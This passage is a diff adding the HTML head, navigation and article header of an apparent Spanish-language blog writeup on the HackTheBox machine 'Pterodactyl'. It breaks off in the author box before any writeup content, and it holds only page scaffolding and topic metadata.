@@ -1,0 +1,2436 @@
+<!doctype html>
+<html
+  lang="es"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="es">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  
+    <title>HackTheBox - Pterodactyl &middot; blog de cosas etc etc</title>
+    <meta name="title" content="HackTheBox - Pterodactyl &middot; blog de cosas etc etc">
+  
+
+  
+  
+    <meta name="description" content="OS: Linux | Dificultad: Medium | Conceptos: Pterodactyl Server Manager, CVE Público, Redis, MySQL, Trivy, UDisks2">
+  
+  
+    <meta name="keywords" content="HTB,Linux,Medium,Pterodactyl,CVE,DB,Trivy,UDisks2,Subdominio,">
+  
+  
+  
+  <link rel="canonical" href="http://localhost:1313/writeups/pterodactyl/">
+  
+
+  
+  
+    <meta name="author" content="Nicolás Seral">
+  
+  
+    
+      
+        
+          <link href="nseral@proton.me" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://www.linkedin.com/in/nseral/" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://github.com/seraldinho" rel="me">
+        
+      
+    
+      
+        
+          <link href="https://app.hackthebox.com/users/1297012" rel="me">
+        
+      
+    
+  
+
+  
+  <meta property="og:url" content="http://localhost:1313/writeups/pterodactyl/">
+  <meta property="og:site_name" content="blog de cosas etc etc">
+  <meta property="og:title" content="HackTheBox - Pterodactyl">
+  <meta property="og:description" content="Resolución de la máquina Pterodactyl">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-02-28T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-02-28T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/writeups/pterodactyl/featured.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/writeups/pterodactyl/featured.png">
+  <meta name="twitter:title" content="HackTheBox - Pterodactyl">
+  <meta name="twitter:description" content="Resolución de la máquina Pterodactyl">
+
+  
+  
+  
+  
+    
+      
+    
+  
+    
+  
+    
+  
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.d09bb18af68146eed0342c92f68bf35fd2a79c50c19bb31f401339d2da6cf5f5d54309900549dd72ad6261210366bf03cea22f23bbc8fd2695f4ceb69e1bbbe0.css"
+    integrity="sha512-0JuxivaBRu7QNCyS9ovzX9KnnFDBm7MfQBM50tps9fXVQwmQBUndcq1iYSEDZr8DzqIvI7vI/SaV9M62nhu74A==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.6f41174b3a05b680820fe08cadbfa5fb7a7ca347b76a0955cdc68b9d8aca1ce24f0547e138cea33bcc7904d551a90afcb1cc7f2d9fe8557075d501419046c08c.js"
+    integrity="sha512-b0EXSzoFtoCCD&#43;CMrb&#43;l&#43;3p8o0e3aglVzcaLnYrKHOJPBUfhOM6jO8x5BNVRqQr8scx/LZ/oVXB11QFBkEbAjA=="></script>
+  
+  
+  
+  
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+  
+    
+  
+  
+    
+  
+  
+    
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.6b483bdc9246a18b35259ce2a40e363ade34a01edf2f3a31094f0a396844e75f863d18735a89b85ee8301f2dfdb9e471bdf47c44483d4b8f0d6eb93701873824.js"
+      integrity="sha512-a0g73JJGoYs1JZzipA42Ot40oB7fLzoxCU8KOWhE51&#43;GPRhzWom4XugwHy39ueRxvfR8REg9S48Nbrk3AYc4JA=="
+      data-copy="Copiar"
+      data-copied="Copiado"></script>
+  
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Writeups",
+    "name": "HackTheBox - Pterodactyl",
+    "headline": "HackTheBox - Pterodactyl",
+    "description": "Resolución de la máquina Pterodactyl",
+    "inLanguage": "es",
+    "url" : "http://localhost:1313/writeups/pterodactyl/",
+    "author" : {
+      "@type": "Person",
+      "name": "Nicolás Seral"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-02-28T00:00:00\u002b00:00",
+    "datePublished": "2026-02-28T00:00:00\u002b00:00",
+    
+    "dateModified": "2026-02-28T00:00:00\u002b00:00",
+    
+    "keywords": ["HTB","Linux","Medium","Pterodactyl","CVE","DB","Trivy","UDisks2","Subdominio"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "4594"
+  },
+  {
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [{
+            "@type": "ListItem",
+            "position":  1 ,
+            "name": "Writeups",
+            "item": "http://localhost:1313/writeups/"
+          },{
+        "@type": "ListItem",
+        "position":  2 ,
+        "name": "HackTheBox - Pterodactyl",
+        "item": "http://localhost:1313/writeups/pterodactyl/"
+      }
+    ]
+  }]
+  </script>
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+  
+
+
+
+
+
+
+  
+  <body class="flex flex-col h-screen m-auto leading-7 max-w-7xl px-6 sm:px-14 md:px-24 lg:px-32 text-lg bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral bf-scrollbar">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content">
+        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
+        Ir al contenido
+      </a>
+    </div>
+    
+    
+      <div class="main-menu flex items-center w-full gap-2 p-1 pl-0">
+  
+  
+    <a href="/" class="text-base font-medium truncate min-w-0 shrink">
+      blog de cosas etc etc
+    </a>
+  
+  <div class="flex items-center ms-auto">
+    <div class="hidden md:flex">
+      <nav class="flex items-center gap-x-5 h-12">
+  
+    
+      
+  
+    <a
+      href="/writeups/"
+      
+      class="flex items-center bf-icon-color-hover"
+      aria-label="Writeups"
+      title="Writeups">
+      
+        <span class="mr-1">
+          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
+<path fill="currentColor"  d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6zm80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3L562.7 256l-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3z"/></svg></span>
+        </span>
+      
+      
+        <span class="text-base font-medium break-normal">
+          Writeups
+        </span>
+      
+    </a>
+  
+
+    
+      
+  
+    <div class="nested-menu">
+      <div class="cursor-pointer flex items-center">
+        <a
+          
+            href="/notas/"
+            
+          
+          aria-label="Notas"
+          class="flex items-center text-base font-medium bf-icon-color-hover"
+          title="Notas">
+          
+            <span class="mr-1">
+              <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M421.7 220.3L188.5 453.4L154.6 419.5L158.1 416H112C103.2 416 96 408.8 96 400V353.9L92.51 357.4C87.78 362.2 84.31 368 82.42 374.4L59.44 452.6L137.6 429.6C143.1 427.7 149.8 424.2 154.6 419.5L188.5 453.4C178.1 463.8 165.2 471.5 151.1 475.6L30.77 511C22.35 513.5 13.24 511.2 7.03 504.1C.8198 498.8-1.502 489.7 .976 481.2L36.37 360.9C40.53 346.8 48.16 333.9 58.57 323.5L291.7 90.34L421.7 220.3zM492.7 58.75C517.7 83.74 517.7 124.3 492.7 149.3L444.3 197.7L314.3 67.72L362.7 19.32C387.7-5.678 428.3-5.678 453.3 19.32L492.7 58.75z"/></svg>
+</span>
+            </span>
+          
+          <span class="text-bg font-bg break-normal" title="Notas">
+            Notas
+          </span>
+          <span>
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </span>
+        </a>
+      </div>
+      <div class="menuhide">
+        <div class="pt-2 p-5 mt-2 rounded-xl backdrop-blur shadow-2xl bg-neutral/25 dark:bg-neutral-800/25">
+          <div class="flex flex-col space-y-3">
+            
+              <a
+                href="/notas/protocolos/"
+                
+                aria-label="Protocolos"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="Protocolos">
+                  Protocolos
+                </span>
+              </a>
+            
+              <a
+                href="/notas/tecnicas/"
+                
+                aria-label="Técnicas"
+                class="flex items-center bf-icon-color-hover">
+                
+                <span class="text-sm font-sm" title="Técnicas">
+                  Técnicas
+                </span>
+              </a>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+  
+
+    
+  
+
+  
+
+  
+
+  
+    <button
+      id="search-button"
+      aria-label="Search"
+      class="text-base bf-icon-color-hover"
+      title="Buscar (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+</nav>
+
+
+
+    </div>
+    <div class="flex md:hidden">
+      <div class="flex items-center h-14 gap-4">
+  
+    <button
+      id="search-button-mobile"
+      aria-label="Search"
+      class="flex items-center justify-center bf-icon-color-hover"
+      title="Buscar (/)">
+      <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span>
+    </button>
+  
+
+  
+
+  
+    <input type="checkbox" id="mobile-menu-toggle" autocomplete="off" class="hidden peer">
+    <label for="mobile-menu-toggle" class="flex items-center justify-center cursor-pointer bf-icon-color-hover">
+      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+    </label>
+
+    <div
+      role="dialog"
+      aria-modal="true"
+      style="scrollbar-gutter: stable;"
+      class="fixed inset-0 z-50 invisible overflow-y-auto px-6 py-20 opacity-0 transition-[opacity,visibility] duration-300 peer-checked:visible peer-checked:opacity-100 bg-neutral-50/97 dark:bg-neutral-900/99
+      bf-scrollbar">
+      <label
+        for="mobile-menu-toggle"
+        class="fixed end-8 top-5 flex items-center justify-center z-50 h-12 w-12 cursor-pointer select-none rounded-full bf-icon-color-hover border bf-border-color bf-border-color-hover bg-neutral-50 dark:bg-neutral-900">
+        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span>
+      </label>
+      <nav class="mx-auto max-w-md space-y-6">
+        
+  
+    
+    <div class="px-2">
+      <a
+        href="/writeups/"
+        aria-label="Writeups"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+          <span class="flex items-center justify-center h-8 w-8 text-2xl">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512">
+<path fill="currentColor"  d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6zm80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3L562.7 256l-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3z"/></svg></span>
+          </span>
+        
+        <span title="Writeups" class="text-2xl font-bold tracking-tight">
+          Writeups
+        </span>
+        
+      </a>
+
+      
+    </div>
+  
+    
+    <div class="px-2">
+      <a
+        href="/notas/"
+        aria-label="Notas"
+        
+        class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+        
+          <span class="flex items-center justify-center h-8 w-8 text-2xl">
+            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M421.7 220.3L188.5 453.4L154.6 419.5L158.1 416H112C103.2 416 96 408.8 96 400V353.9L92.51 357.4C87.78 362.2 84.31 368 82.42 374.4L59.44 452.6L137.6 429.6C143.1 427.7 149.8 424.2 154.6 419.5L188.5 453.4C178.1 463.8 165.2 471.5 151.1 475.6L30.77 511C22.35 513.5 13.24 511.2 7.03 504.1C.8198 498.8-1.502 489.7 .976 481.2L36.37 360.9C40.53 346.8 48.16 333.9 58.57 323.5L291.7 90.34L421.7 220.3zM492.7 58.75C517.7 83.74 517.7 124.3 492.7 149.3L444.3 197.7L314.3 67.72L362.7 19.32C387.7-5.678 428.3-5.678 453.3 19.32L492.7 58.75z"/></svg>
+</span>
+          </span>
+        
+        <span title="Notas" class="text-2xl font-bold tracking-tight">
+          Notas
+        </span>
+        
+          <label
+            for="fullscreen-submenu-notas"
+            class="ms-auto flex items-center justify-center h-10 w-10 cursor-pointer rounded-lg bf-icon-color-hover border bf-border-color bf-border-color-hover">
+            <span class="relative block icon"><svg
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 20 20"
+  fill="currentColor"
+  aria-hidden="true"
+>
+  <path
+    fill-rule="evenodd"
+    d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z"
+    clip-rule="evenodd"
+  />
+</svg>
+</span>
+          </label>
+        
+      </a>
+
+      
+        <input checked type="checkbox" id="fullscreen-submenu-notas" autocomplete="off" class="hidden peer/full">
+
+        <div
+          class="grid grid-rows-[0fr] transition-[grid-template-rows] duration-300 peer-checked/full:grid-rows-[1fr]">
+          <div class="overflow-hidden">
+            <div class="ms-7 mt-4">
+              
+                <a
+                  href="/notas/protocolos/"
+                  aria-label="Protocolos"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="Protocolos" class="text-lg">
+                    Protocolos
+                  </span>
+                </a>
+              
+                <a
+                  href="/notas/tecnicas/"
+                  aria-label="Técnicas"
+                  
+                  class="flex items-center gap-3 p-2 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
+                  
+                  <span title="Técnicas" class="text-lg">
+                    Técnicas
+                  </span>
+                </a>
+              
+            </div>
+          </div>
+        </div>
+      
+    </div>
+  
+
+        
+  
+
+        
+  
+
+      </nav>
+    </div>
+  
+</div>
+
+
+
+
+
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+  <article>
+    
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/writeups/pterodactyl/featured_hu_a616f292c63b1ccf.png"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/writeups/pterodactyl/featured_hu_a616f292c63b1ccf.png"></script>
+  
+      
+    
+
+    
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/"
+      >Nicolás Seral</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeups/"
+      >Writeups</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden">
+    <a class="hover:underline decoration-neutral-300 dark:underline-neutral-600" href="/writeups/pterodactyl/"
+      >HackTheBox - Pterodactyl</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HackTheBox - Pterodactyl
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-02-28T00:00:00&#43;00:00">28 de febrero de 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Tiempo de lectura">22 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+      
+        
+  
+  
+  
+  
+  
+  
+
+  
+
+  
+    
+    
+<div class="flex author">
+  
+    
+    
+      
+    
+    
+      
+      
+      
+        
+        
+        
+      
+      <img
+        class="!mt-0 !mb-0 h-24 w-24 rounded-full me-4"
+        width="96"
+        height="96"
+        alt="Nicolás Seral"
+        src="/img/pinguino3_hu_fd56ac1f77425976.png"
+        data-zoom-src="/img/pinguino3_hu_7423f79bed0f83d4.png">
+    
+  
+  <div class="place-self-center">
+    
+      <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+        Autor
+      </div>
+      <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+        Nicolás Seral
+      </div>
+    
+    
+      <div class="text-sm text-neutral-700 dark:text-neutral-400">bla bla bla bla</div>
+    
+    <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500 space-x-2">
+    
+      
+        
+        <a
+          class="email-link hover:text-primary-700 dark:hover:text-primary-400"
+          href="#"
+          
+            data-email="bnNlcmFsQHByb3Rvbi5tZQ=="
+          
+          target="_blank"
+          aria-label="Email"
+          title="Email"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+</span></span></a
+        >
+      
+    
+      
+        
+        <a
+          class=" hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://www.linkedin.com/in/nseral/"
+          
+          target="_blank"
+          aria-label="Linkedin"
+          title="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></span></a
+        >
+      
+    
+      
+        
+        <a
+          class=" hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://github.com/seraldinho"
+          
+          target="_blank"
+          aria-label="Github"
+          title="Github"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></span></a
+        >
+      
+    
+      
+        
+        <a
+          class=" hover:text-primary-700 dark:hover:text-primary-400"
+          href="https://app.hackthebox.com/users/1297012"
+          
+          target="_blank"
+          aria-label="Hackthebox"
+          title="Hackthebox"
+          rel="me noopener noreferrer"
+          ><span class="inline-block align-text-bottom"><span class="relative block icon"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M4 15.8294V15.75V8C4 7.69114 4.16659 7.40629 4.43579 7.25487L11.6182 3.21475L11.6727 3.18411C11.8759 3.06979 12.1241 3.06979 12.3273 3.18411L19.6105 7.28092C19.8511 7.41625 20 7.67083 20 7.94687V15.75V15.8294C20 16.1119 19.8506 16.3733 19.6073 16.5167L12.379 20.7766C12.1451 20.9144 11.8549 20.9144 11.621 20.7766L4.39267 16.5167C4.14935 16.3733 4 16.1119 4 15.8294Z" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/>
+  <path d="M12 21V12" stroke="currentColor" stroke-width="2.6" stroke-linecap="round"/>
+  <path d="M12 12L4 7.5" stroke="currentColor" stroke-width="2.6" stroke-linecap="round"/>
